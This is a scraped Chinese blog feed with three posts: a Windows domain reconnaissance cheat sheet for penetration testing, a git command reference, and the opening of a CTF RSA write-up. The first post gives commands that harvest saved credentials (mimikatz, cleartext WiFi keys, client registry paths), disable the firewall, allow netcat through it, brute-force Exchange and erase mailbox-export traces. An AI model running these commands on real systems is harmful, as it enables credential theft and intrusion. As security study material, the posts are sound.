<h3 id="查询域机器"><a href="#查询域机器" class="headerlink" title="查询域机器"></a>查询域机器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure>

<h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view 				查看同一域内机器列表</span><br><span class="line">net view \\IP			查看IP的机器共享</span><br><span class="line">net view \\TEST			查看TEST计算机的共享资源列表</span><br><span class="line">net view /domain 		查看内网存在多少个域</span><br><span class="line">net view /domain:hack	查看hack域中的机器列表</span><br></pre></td></tr></table></figure>

<h2 id="本地网络对象信息"><a href="#本地网络对象信息" class="headerlink" title="本地网络对象信息"></a>本地网络对象信息</h2><h3 id="本地用户"><a href="#本地用户" class="headerlink" title="本地用户"></a>本地用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net localgroup administrators 							查看本机管理员组成员</span><br><span class="line">net localgroup administrators /domain 					登录本机的域管理员</span><br><span class="line">net localgroup administrators workgroup\user01 /add		域用户添加到本机管理组</span><br></pre></td></tr></table></figure>

<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="共享-1"><a href="#共享-1" class="headerlink" title="共享"></a>共享</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<h3 id="Arp路由表"><a href="#Arp路由表" class="headerlink" title="Arp路由表"></a>Arp路由表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<h3 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a>查看hosts文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<h3 id="查看DNS"><a href="#查看DNS" class="headerlink" title="查看DNS"></a>查看DNS</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /displaydns</span><br></pre></td></tr></table></figure>

<p>在WINSERVER上，使用dnscmd获取DNS记录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Dnscmd /ZonePrint hack.local</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806104621284.png" class title="image-20210806104621284">

<p>非WINSERVER机器上，使用PowerView.ps1</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">import-module</span> PowerView.ps1</span><br><span class="line"><span class="built_in">Get-DNSRecord</span> <span class="literal">-ZoneName</span> hack.local</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806104911527.png" class title="image-20210806104911527">

<h3 id="nbtscan、nmap"><a href="#nbtscan、nmap" class="headerlink" title="nbtscan、nmap"></a>nbtscan、nmap</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nbtscan.exe 192.168.1.4/24</span><br></pre></td></tr></table></figure>

<h3 id="icmp"><a href="#icmp" class="headerlink" title="icmp"></a>icmp</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.1.%I | findstr &quot;TTL=&quot;   #利用ICMP协议快速探测内网</span><br></pre></td></tr></table></figure>

<h3 id="arp-exe"><a href="#arp-exe" class="headerlink" title="arp.exe"></a>arp.exe</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp.exe –t 192.168.1.0/20  #arp-scan工具，需要上传arp.exe</span><br></pre></td></tr></table></figure>

<h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command &quot;&amp; &#123;Import-Module C:\windows\temp\InvokeARPScan.ps1; Invoke-ARPScan -CIDR 192.168.1.0/24&#125;&quot; &gt;&gt; C:\windows\temp\log.txt  </span><br><span class="line">#使用Nishang中的Invoke-ARPScan.ps1脚本，可以将脚本上传到目标主机执行，也可以直接远程加载执行</span><br></pre></td></tr></table></figure>

<h3 id="scanline"><a href="#scanline" class="headerlink" title="scanline"></a>scanline</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scanline -h -t 22,80- 89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,3389,5432 -u 53,161,137,139 -O c:\windows\temp\log.txt -p 192.168.1.1-254 /b   </span><br><span class="line">#使用ScanLine对常规 TCP/UDP 端口扫描探测内网</span><br></pre></td></tr></table></figure>

<h2 id="会话信息"><a href="#会话信息" class="headerlink" title="会话信息"></a>会话信息</h2><blockquote>
<p>用于查看管理员（或某用户）登录过哪些机器，机器被哪些用户登陆过</p>
</blockquote>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PowerView  https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span><br></pre></td></tr></table></figure>

<p>查看用户登录过哪些机器</p>
<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230416357.png" class title="image-20210805230416357">

<p>查询机器被哪些用户登录过</p>
<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210805230523704.png" alt="image-20210805230523704" style="zoom: 67%;">

<h2 id="凭据信息"><a href="#凭据信息" class="headerlink" title="凭据信息"></a>凭据信息</h2><h3 id="navicat"><a href="#navicat" class="headerlink" title="navicat"></a>navicat</h3><table>
<thead>
<tr>
<th>MySQL</th>
<th>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</th>
</tr>
</thead>
<tbody><tr>
<td>MariaDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>MongoDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Microsoft  SQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Oracle</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>SQLite</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td>
</tr>
</tbody></table>
<h3 id="SecureCRT"><a href="#SecureCRT" class="headerlink" title="SecureCRT"></a>SecureCRT</h3><table>
<thead>
<tr>
<th>xp&#x2F;win2003</th>
<th>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</th>
</tr>
</thead>
<tbody><tr>
<td>win7&#x2F;win2008以上</td>
<td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
</tr>
</tbody></table>
<h3 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h3><table>
<thead>
<tr>
<th>Xshell 5</th>
<th>%userprofile%\Documents\NetSarang\Xshell\Sessions</th>
</tr>
</thead>
<tbody><tr>
<td>Xshell 6</td>
<td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td>
</tr>
</tbody></table>
<h3 id="WinSCP"><a href="#WinSCP" class="headerlink" title="WinSCP"></a>WinSCP</h3><table>
<thead>
<tr>
<th>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</th>
</tr>
</thead>
</table>
<h3 id="VNC"><a href="#VNC" class="headerlink" title="VNC"></a>VNC</h3><table>
<thead>
<tr>
<th>RealVNC</th>
<th>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</th>
<th>Password</th>
</tr>
</thead>
<tbody><tr>
<td>TightVNC</td>
<td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td>
<td>Password  or PasswordViewOnly</td>
</tr>
<tr>
<td>TigerVNC</td>
<td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td>
<td>Password</td>
</tr>
<tr>
<td>UltraVNC</td>
<td>C:\Program  Files\UltraVNC\ultravnc.ini</td>
<td>passwd or  passwd2</td>
</tr>
</tbody></table>
<h3 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey/list</span><br></pre></td></tr></table></figure>

<h2 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h2><h3 id="解密Chrome密码："><a href="#解密Chrome密码：" class="headerlink" title="解密Chrome密码："></a>解密Chrome密码：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz dpapi::chrome /in:&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot; /unprotect</span><br></pre></td></tr></table></figure>

<h3 id="解密Credential："><a href="#解密Credential：" class="headerlink" title="解密Credential："></a>解密Credential：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz vault::cred /patch</span><br></pre></td></tr></table></figure>

<h2 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>

<h2 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup  -type=ns domain.comnslookupsserver  dns.domain.comls  domain.com</span><br></pre></td></tr></table></figure>

<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure>

<h2 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">for /f &quot;skip=9 tokens=1,2 delims=:&quot; %i in (&#x27;netsh wlan show profiles&#x27;)  do  @echo %j | findstr -i -v echo |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>

<h2 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h2><p>学习提权的时候再做了解</p>
<h2 id="其他基础信息收集"><a href="#其他基础信息收集" class="headerlink" title="其他基础信息收集"></a>其他基础信息收集</h2><h3 id="获取当前shell权限"><a href="#获取当前shell权限" class="headerlink" title="获取当前shell权限"></a>获取当前shell权限</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whoami /user &amp;&amp; whoami /priv</span><br></pre></td></tr></table></figure>

<p>别看到普通权限就提权，实在没法深入再提权。</p>
<p>提权可能打崩服务器，或者不免杀触发警报。</p>
<img src="/2022/05/15/Windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86list/image-20210806105745713.png" alt="image-20210806105745713" style="zoom: 67%;">

<h3 id="systeminfo"><a href="#systeminfo" class="headerlink" title="systeminfo"></a>systeminfo</h3><p>主要关注修补程序</p>
<h3 id="机器名"><a href="#机器名" class="headerlink" title="机器名"></a>机器名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hostname</span><br></pre></td></tr></table></figure>

<h3 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic OS get Caption,CSDVersion,OSArchitecture,Version</span><br></pre></td></tr></table></figure>

<h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ver</span><br></pre></td></tr></table></figure>

<h3 id="查看杀软"><a href="#查看杀软" class="headerlink" title="查看杀软"></a>查看杀软</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br></pre></td></tr></table></figure>

<h3 id="查看当前安装程序"><a href="#查看当前安装程序" class="headerlink" title="查看当前安装程序"></a>查看当前安装程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure>

<h3 id="查看在线用户"><a href="#查看在线用户" class="headerlink" title="查看在线用户"></a>查看在线用户</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">quser</span><br></pre></td></tr></table></figure>

<h3 id="查看进程"><a href="#查看进程" class="headerlink" title="查看进程"></a>查看进程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /v    #/v可以查看是谁开启的进程</span><br></pre></td></tr></table></figure>

<h3 id="查看当前登录域"><a href="#查看当前登录域" class="headerlink" title="查看当前登录域"></a>查看当前登录域</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<h3 id="查询并开启RDP"><a href="#查询并开启RDP" class="headerlink" title="查询并开启RDP"></a>查询并开启RDP</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber    #查看远程连接端口</span><br><span class="line">wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1    #在 Windows Server 2003 中开启 3389 端口</span><br><span class="line"></span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1  </span><br><span class="line">wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1</span><br><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>

<h3 id="查看RDP连接历史"><a href="#查看RDP连接历史" class="headerlink" title="查看RDP连接历史"></a>查看RDP连接历史</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /l</span><br></pre></td></tr></table></figure>

<h3 id="查看防火墙配置"><a href="#查看防火墙配置" class="headerlink" title="查看防火墙配置"></a>查看防火墙配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netsh firewall set opmode disable  			  #winserver2003及之前版本 关闭防火墙</span><br><span class="line">netsh advfirewall set allprofiles state off   #winserver2003之后版本 关闭防火墙</span><br><span class="line">netsh firewall show config #查看防火墙配置</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable  #Windows Server 2003 系统及之前版本，允许指定程序全部连接</span><br><span class="line"></span><br><span class="line">netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: \nc.exe&quot;  				#Windows Server 2003 之后系统版本允许指定程序连入</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;  				# 允许指定程序连出</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow   #允许 3389 端口放行</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; 								#自定义防火墙日志储存位置</span><br></pre></td></tr></table></figure>

<h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此需要exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p>
<h3 id="邮箱用户密码爆破"><a href="#邮箱用户密码爆破" class="headerlink" title="邮箱用户密码爆破"></a>邮箱用户密码爆破</h3><p>使用ruler工具对owa接口进行爆破：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ruler --domain targetdomain.com brute --users /path/to/user.txt --passwords /path/to/passwords.txt</span><br></pre></td></tr></table></figure>

<p>ruler工具会自动搜索owa可以爆破的接口，如：</p>
<p><a href="https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml">https://autodiscover.targetdomain.com/autodiscover/autodiscover.xml</a></p>
<p>其他如ews接口也存在被暴力破解利用的风险：</p>
<p><a href="https://mail.targetdomain.com/ews">https://mail.targetdomain.com/ews</a></p>
<h3 id="通讯录收集"><a href="#通讯录收集" class="headerlink" title="通讯录收集"></a>通讯录收集</h3><p>在获取一个邮箱账号密码后，可以使用MailSniper收集通讯录，当拿到通讯录后，可以再次利用上述爆破手段继续尝试弱密码，但是记住，密码次数不要太多，很有可能会造成域用户锁定：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-GlobalAddressList -ExchHostname mail.domain.com -UserName domain\username -Password Fall2016 -OutFile global-address-list.txt</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>当我们拿下exchange服务器后，可以做一些信息收集，包括不限于用户、邮件。</p>
<p>获取所有邮箱用户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-Mailbox</span><br></pre></td></tr></table></figure>

<p>导出邮件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">New-MailboxexportRequest -mailbox username -FilePath (&quot;\\localhost\c$\test\username.pst&quot;)</span><br></pre></td></tr></table></figure>

<p>也可以通过web口导出，登录：</p>
<p><a href="https://mail.domain.com/ecp/">https://mail.domain.com/ecp/</a></p>
<p>导出后会有记录，用如下命令可以查看：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br></pre></td></tr></table></figure>

<p>删除某个导出记录：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remove-MailboxExportRequest -Identity &#x27;username\mailboxexport&#x27; -Confirm:$false</span><br></pre></td></tr></table></figure>



<h2 id="Seatbelt"><a href="#Seatbelt" class="headerlink" title="Seatbelt"></a>Seatbelt</h2><h2 id="Bloodhound"><a href="#Bloodhound" class="headerlink" title="Bloodhound"></a>Bloodhound</h2><p>可以了解，都不推荐使用</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>域信息收集</category>
      </categories>
      <tags>
        <tag>-内网渗透 -信息收集 -windows域环境</tag>
      </tags>
  </entry>
  <entry>
    <title>git用法小记</title>
    <url>/2022/01/23/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
<h2 id="1、常用"><a href="#1、常用" class="headerlink" title="1、常用"></a>1、常用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:yeszao/dofiler.git     # 配置远程git版本库</span><br><span class="line"></span><br><span class="line">git pull origin master                     # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push origin master                     # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git fetch origin                        # 从远程库获取代码</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git branch                           # 显示所有分支</span><br><span class="line"></span><br><span class="line">git checkout master                       # 切换到master分支</span><br><span class="line"></span><br><span class="line">git checkout -b dev                       # 创建并切换到dev分支</span><br><span class="line"></span><br><span class="line">git commit -m &quot;first version&quot;                  # 提交</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git status                           # 查看状态</span><br><span class="line"></span><br><span class="line">git log                             # 查看提交历史</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git config --global core.editor vim               # 设置默认编辑器为vim（git默认用nano）</span><br><span class="line"></span><br><span class="line">git config core.ignorecase false                # 设置大小写敏感</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;YOUR NAME&quot;            # 设置用户名</span><br><span class="line"></span><br><span class="line">git config --global user.email &quot;YOUR EMAIL ADDRESS&quot;       # 设置邮箱</span><br></pre></td></tr></table></figure>



<h2 id="2、别名alias"><a href="#2、别名alias" class="headerlink" title="2、别名alias"></a>2、别名alias</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global alias.br=&quot;branch&quot;                 # 创建/查看本地分支</span><br><span class="line"></span><br><span class="line">git config --global alias.co=&quot;checkout&quot;               # 切换分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cb=&quot;checkout -b&quot;            # 创建并切换到新分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cm=&quot;commit -m&quot;              # 提交</span><br><span class="line"></span><br><span class="line">git config --global alias.st=&quot;status&quot;                 # 查看状态</span><br><span class="line"></span><br><span class="line">git config --global alias.pullm=&quot;pull origin master&quot;  # 拉取分支</span><br><span class="line"></span><br><span class="line">git config --global alias.pushm=&quot;push origin master&quot;  # 提交分支</span><br><span class="line"></span><br><span class="line">git config --global alias.log=&quot;git log --oneline --graph --decorate --color=always&quot; # 单行、分颜色显示记录</span><br><span class="line"></span><br><span class="line">git config --global alias.logg=&quot;git log --graph --all --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)— %an%C(reset)%C(bold yellow)%d%C(reset)&#x27; --abbrev-commit --date=relative&quot; # 复杂显示</span><br></pre></td></tr></table></figure>



<h2 id="3、创建版本库"><a href="#3、创建版本库" class="headerlink" title="3、创建版本库"></a>3、创建版本库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone                  # 克隆远程版本库</span><br><span class="line"></span><br><span class="line">git init                        # 初始化本地版本库</span><br></pre></td></tr></table></figure>



<h2 id="4、修改和提交"><a href="#4、修改和提交" class="headerlink" title="4、修改和提交"></a>4、修改和提交</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status                      # 查看状态</span><br><span class="line"></span><br><span class="line">git diff                        # 查看变更内容</span><br><span class="line"></span><br><span class="line">git add .                       # 跟踪所有改动过的文件</span><br><span class="line"></span><br><span class="line">git add                   # 跟踪指定的文件</span><br><span class="line"></span><br><span class="line">git mv               # 文件改名</span><br><span class="line"></span><br><span class="line">git rm                    # 删除文件</span><br><span class="line"></span><br><span class="line">git rm --cached           # 停止跟踪文件但不删除</span><br><span class="line"></span><br><span class="line">git commit -m “commit message”  # 提交所有更新过的文件</span><br><span class="line"></span><br><span class="line">git commit --amend              # 修改最后一次提交</span><br></pre></td></tr></table></figure>



<h2 id="5、查看历史"><a href="#5、查看历史" class="headerlink" title="5、查看历史"></a>5、查看历史</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log                         # 查看提交历史</span><br><span class="line"></span><br><span class="line">git log -p                # 查看指定文件的提交历史</span><br><span class="line"></span><br><span class="line">git blame                 # 以列表方式查看指定文件的提交历史</span><br></pre></td></tr></table></figure>



<h2 id="6、撤销"><a href="#6、撤销" class="headerlink" title="6、撤销"></a>6、撤销</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD           # 撤消工作目录中所有未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git reset --hard       # 撤销到某个特定版本</span><br><span class="line"></span><br><span class="line">git checkout HEAD         # 撤消指定的未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git checkout --           # 同上一个命令</span><br><span class="line"></span><br><span class="line">git revert              # 撤消指定的提交分支与标签</span><br></pre></td></tr></table></figure>



<h2 id="7、分支与标签"><a href="#7、分支与标签" class="headerlink" title="7、分支与标签"></a>7、分支与标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch                      # 显示所有本地分支</span><br><span class="line"></span><br><span class="line">git checkout        # 切换到指定分支或标签</span><br><span class="line"></span><br><span class="line">git branch          # 创建新分支</span><br><span class="line"></span><br><span class="line">git branch -d           # 删除本地分支</span><br><span class="line"></span><br><span class="line">git tag                         # 列出所有本地标签</span><br><span class="line"></span><br><span class="line">git tag                # 基于最新提交创建标签</span><br><span class="line"></span><br><span class="line">git tag -a &quot;v1.0&quot; -m &quot;一些说明&quot;  # -a指定标签名称，-m指定标签说明</span><br><span class="line"></span><br><span class="line">git tag -d             # 删除标签</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git checkout dev                # 合并特定的commit到dev分支上</span><br><span class="line"></span><br><span class="line">git cherry-pick 62ecb3</span><br></pre></td></tr></table></figure>



<h2 id="8、合并与衍合"><a href="#8、合并与衍合" class="headerlink" title="8、合并与衍合"></a>8、合并与衍合</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git merge               # 合并指定分支到当前分支</span><br><span class="line"></span><br><span class="line">git merge --abort               # 取消当前合并，重建合并前状态</span><br><span class="line"></span><br><span class="line">git merge dev -Xtheirs          # 以合并dev分支到当前分支，有冲突则以dev分支为准</span><br><span class="line"></span><br><span class="line">git rebase              # 衍合指定分支到当前分支</span><br></pre></td></tr></table></figure>



<h2 id="9、远程操作"><a href="#9、远程操作" class="headerlink" title="9、远程操作"></a>9、远程操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote -v                   # 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote show         # 查看指定远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote add    # 添加远程版本库</span><br><span class="line"></span><br><span class="line">git remote remove       # 删除指定的远程版本库</span><br><span class="line"></span><br><span class="line">git fetch               # 从远程库获取代码</span><br><span class="line"></span><br><span class="line">git pull       # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push       # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git push : # 删除远程分支或标签</span><br><span class="line"></span><br><span class="line">git push --tags                 # 上传所有标签</span><br></pre></td></tr></table></figure>



<h2 id="10、打包"><a href="#10、打包" class="headerlink" title="10、打包"></a>10、打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git archive --format=zip --output ../file.zip master    # 将master分支打包成file.zip文件，保存在上一级目录</span><br><span class="line"></span><br><span class="line">git archive --format=zip --output ../v1.2.zip v1.2      # 打包v1.2标签的文件，保存在上一级目录v1.2.zip文件中</span><br><span class="line"></span><br><span class="line">git archive --format=zip v1.2 &gt; ../v1.2.zip             # 作用同上一条命令</span><br></pre></td></tr></table></figure>



<h2 id="11、全局和局部配置"><a href="#11、全局和局部配置" class="headerlink" title="11、全局和局部配置"></a>11、全局和局部配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局配置保存在：$Home/.gitconfig</span><br><span class="line">本地仓库配置保存在：.git/config</span><br></pre></td></tr></table></figure>



<h2 id="12、远程和本地合并"><a href="#12、远程和本地合并" class="headerlink" title="12、远程和本地合并"></a>12、远程和本地合并</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init                              # 初始化本地代码仓</span><br><span class="line"></span><br><span class="line">git add .                             # 添加本地代码</span><br><span class="line"></span><br><span class="line">git commit -m &quot;add local source&quot;      # 提交本地代码</span><br><span class="line"></span><br><span class="line">git pull origin master                # 下载远程代码</span><br><span class="line"></span><br><span class="line">git merge master                      # 合并master分支</span><br><span class="line"></span><br><span class="line">git push -u origin master             # 上传代码</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内功心法</category>
        <category>git命令</category>
      </categories>
      <tags>
        <tag>-git语法 -git仓库</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Crypto系列之Normal_RSA</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BNormal_RSA/</url>
    <content><![CDATA[<h1 id="【攻防世界】Crypto系列之Normal-RSA"><a href="#【攻防世界】Crypto系列之Normal-RSA" class="headerlink" title="【攻防世界】Crypto系列之Normal_RSA"></a>【攻防世界】Crypto系列之Normal_RSA</h1><p>这道题存在两个文件flag.enc和pubkey.pem，从文件名不难看出flag.enc是对flag文件进行了加密，而pubkey.pem就是RSA算法中的公钥，两个文件如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BNormal_RSA/image-20231122194949887.png" class title="image-20231122194949887">

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Crypto%E7%B3%BB%E5%88%97%E4%B9%8BNormal_RSA/image-20231122195003056.png" class title="image-20231122195003056">

<p>这里又要使用RSA算法，解题思路：</p>
<ul>
<li>解析pubkey.pem文件，得到大整数n和公钥e</li>
<li>对大整数n进行因数分解，得到p和q</li>
<li>由q和p计算出欧拉函数oula(n)&#x3D;(p-1)(q-1)</li>
<li>由oula(n)，e计算出私钥d</li>
<li>讲私钥d保存为pem格式</li>
</ul>
<p><strong>解密公钥文件</strong></p>
<p>第一种方法是使用openssl对公钥文件进行解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl rsa -pubin -text -modulus -in pubkey.pem</span><br></pre></td></tr></table></figure>

